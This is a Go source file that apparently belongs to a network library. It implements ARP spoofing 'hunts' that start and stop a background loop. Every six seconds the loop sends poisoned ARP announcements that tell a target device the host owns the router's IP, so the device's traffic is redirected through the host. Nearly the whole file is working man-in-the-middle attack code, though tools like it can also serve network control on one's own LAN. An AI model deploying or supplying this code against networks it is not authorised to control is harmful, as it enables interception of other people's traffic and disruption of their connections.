package arp_spoofer

import (
	"net/netip"
	"time"

	"github.com/irai/packet"
)

// IsHunting returns true if the ip is activelly hunted via a goroutine
func (h *Handler) IsHunting(ip netip.Addr) bool {
	_, b := h.findHuntByIP(ip)
	return b
}

func (h *Handler) findHuntByIP(ip netip.Addr) (packet.Addr, bool) {
	for _, v := range h.huntList {
		if v.IP == ip {
			return v, true
		}
	}
	return packet.Addr{}, false
}

// StartHunt starts a background goroutine to spoof the target addr. This will continue
// until StopHunt() is called.
//
// ARP StartHunt performs the following:
//  1. add addr to "hunt" list
//  2. start spoof goroutine to which will continuously spoof the client ARP table
//
func (h *Handler) StartHunt(addr packet.Addr) (packet.HuntStage, error) {
	if addr.MAC == nil || !addr.IP.Is4() {
		return packet.StageNoChange, packet.ErrInvalidIP
	}

	h.arpMutex.Lock()
	defer h.arpMutex.Unlock()
	if _, found := h.huntList[string(addr.MAC)]; found {
		return packet.StageHunt, nil
	}
	h.huntList[string(addr.MAC)] = addr

	if Logger.IsInfo() {
		Logger.Msg("start hunt").Struct(addr).Write()
	}
	go h.spoofLoop(addr)
	return packet.StageHunt, nil
}

// StopHunt stops spoofing the target addr.
func (h *Handler) StopHunt(addr packet.Addr) (packet.HuntStage, error) {
	h.arpMutex.Lock()
	_, hunting := h.huntList[string(addr.MAC)]
	if hunting {
		// remove the addr from the hunt list which will cause hunting goroutine to terminate.
		delete(h.huntList, string(addr.MAC))
	}
	h.arpMutex.Unlock()
	if !hunting {
		Logger.Msg("error stop hunt failed - not in hunt stage").Struct(addr).Write()
	}
	if Logger.IsInfo() {
		Logger.Msg("stop hunt").Struct(addr).Write()
	}
	return packet.StageNormal, nil
}

// spoofLoop attacks the client with ARP attacks. The loop will
// continuously send poisoned arp packets to client to keep its arp
// table pointing to us as the default gw.
//
func (h *Handler) spoofLoop(addr packet.Addr) {
	// The client ARP table is refreshed often and only last for a short while (i.e. a few minutes)
	// To make sure the cache stays poisoned, replay every few seconds with a loop.
	// 6 second re-arp seem to be adequate;
	// Experimented with 300ms but no noticeable improvement other the chatty net.
	ticker := time.NewTicker(time.Second * 6).C
	startTime := time.Now()
	nTimes := 0
	for {
		h.arpMutex.Lock()
		targetAddr, hunting := h.findHuntByIP(addr.IP)
		h.arpMutex.Unlock()

		if !hunting || h.closed {
			if Logger.IsInfo() {
				Logger.Msg("hunt loop stop").Struct(addr).Int("repeat", nTimes).String("duration", time.Since(startTime).String()).Write()
			}

			// When hunt terminate normally, clear the arp table with announcement to real router mac.
			if !h.closed {
				// request will fix the ether src mac to host to prevent ethernet port disabling
				if err := h.RequestRaw(addr.MAC, h.session.NICInfo.RouterAddr4, h.session.NICInfo.RouterAddr4); err != nil {
					Logger.Msg("error send request packet").Struct(addr).Error(err).Write()
				}
			}
			return
		}

		// Re-arp target to change router to host so all traffic comes to us
		//
		// Announce to target that we own the router IP; This will update the target arp table with our mac
		// i.e. tell target I am 192.168.0.1
		err := h.AnnounceTo(targetAddr.MAC, h.session.NICInfo.RouterAddr4.IP)
		if err != nil {
			Logger.Msg("error send announcement packet").Struct(targetAddr).Error(err).Write()
			return
		}

		if nTimes%16 == 0 { // minimise logging
			if Logger.IsInfo() {
				Logger.Msg("hunt loop attack").Struct(targetAddr).Int("repeat", nTimes).String("duration", time.Since(startTime).String()).Write()
			}
		}
		nTimes++

		select {
		case <-h.closeChan:
			// do nothing, we will detect the channel is closed at the start of the loop and terminate the goroutine
		case <-ticker:
		}
	}
}
